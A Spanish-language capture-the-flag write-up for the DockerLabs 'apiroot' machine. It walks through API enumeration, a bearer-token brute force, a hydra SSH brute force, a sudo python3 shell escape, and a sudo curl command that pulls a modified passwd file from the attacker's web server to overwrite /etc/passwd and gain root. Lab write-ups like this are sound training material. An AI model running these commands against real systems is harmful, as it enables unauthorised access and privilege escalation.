nmap: 22, 5000

![image](https://github.com/user-attachments/assets/ebd72e6c-0cae-4a3a-a87b-32bd4d6d0d17)

entramos a la pagina por el puerto 5000

![[dockerlabs/medio/apiroot/pagina1.png]]

en la pagina nos da un código:

![[dockerlabs/medio/apiroot/codigo1.png]]

que si lo probamos da

![[dockerlabs/medio/apiroot/codigo2.png]]

nada interesante en si. pero en la pagina veremos algo, que cada ejemplo de API por ejemplo, GET O POST y así, tienen como comienzo "/api"

![[api2.png]]

hacemos un gobuster

![[dockerlabs/medio/apiroot/gobuster.png]]

y nos da "users", lo probamos

![[dockerlabs/medio/apiroot/pagina2.png]]

pero la verdad no da mucho mas, buscamos alguna forma de explotar esto, buscamos alguna explotación de "APIs"  y encontre esta: https://github.com/Maalfer/bruteapi/blob/main/bruteapi.sh
que es un .sh, así que nos copiamos el código, creamos un .sh y le damos permisos de ejecución.  

como de por si el ".sh" no esta funcionando o dando algo, lo lanzamos con el comando que nos dio la pagina al principio

     curl -H "Authorization: Bearer password_secreta" http://localhost:5000/api/directorio_oculto

pero medicando para que me de alguna respuesta diferente porque de por si el, ".sh"  es para hacer fuerza bruta, pero basados en el código que nos dieron.  lanzamos

     bash exploit.sh http://172.17.0.2:5000/api/users /usr/share/wordlists/rockyou.txt

![[exploit1.png]]

![[dockerlabs/medio/apiroot/contraseña.png]]

obtenemos la contraseña

     password1

y utilizamos la opción 2 que es `Bearer Token`, lo que intentara dar como una ¨coincidencia¨  

entonces si lanzamos el comando

     curl -H "Authorization: Bearer password1" http://172.17.0.2:5000/api/users

![[dockerlabs/medio/apiroot/usuarios.png]]

cambiamos en el código la "password_secreta" por la contraseña encontrada, cambiamos la IP a la de la maquina victima y "directorio_oculto" por "users" que fue lo que nos dio el gobuster. 
entonces obtenemos dos nombres 

     bob y dylan

hacemos una fuerza bruta:

![[dockerlabs/medio/apiroot/hydra.png]]

obtenemos a "bob" y "password1" y tenemos la conexion

![[dockerlabs/medio/apiroot/conexion.png]]

dentro tenemos esto

![[dockerlabs/medio/apiroot/sudo -l.png]]

un python3 y un "app.py", buscamos el de python3 https://gtfobins.github.io/gtfobins/python/#sudo

![[dockerlabs/medio/apiroot/gtf.png]]

lanzamos

     sudo -u balulero python3 -c 'import os; os.system("/bin/sh")'

y somos el usuario balulero

![[dockerlabs/medio/apiroot/usuario2.png]]

tenemos dentro un curl 

![[dockerlabs/medio/apiroot/curl.png]]

lo buscamos en gtf igual

![[dockerlabs/medio/apiroot/conexion2.png]]

y tendremos que abrir un servidor y clonar en este caso el archivo "passwd" 

![[la x.png]]

entonces copiamos el archivo de passwd desde la carpeta victima y en nuestra terminal le sacamos la "x" entonces ahora vamos a pasar desde nuestra maquina a la victima el archivo modificado desde un servidor como nos indica lo de FTFOBINS. 

abrimos el servidor 

     python3 -m http.server 

en la terminal victima colocamos 

    URL=http://172.17.0.1:8000/passwd
    LFILE=/etc/passwd
    sudo curl $URL -o $LFILE

entonces tendremos algo así 

![[server.png]]

ahora verificamos que se remplazo el archivo por el modificado

![[dockerlabs/medio/apiroot/root1.png]]

y vemos que no tiene la "x" así que se modifico correctamente, ahora haremos un "su root"

![[dockerlabs/medio/apiroot/rootf.png]]

y somos root! 
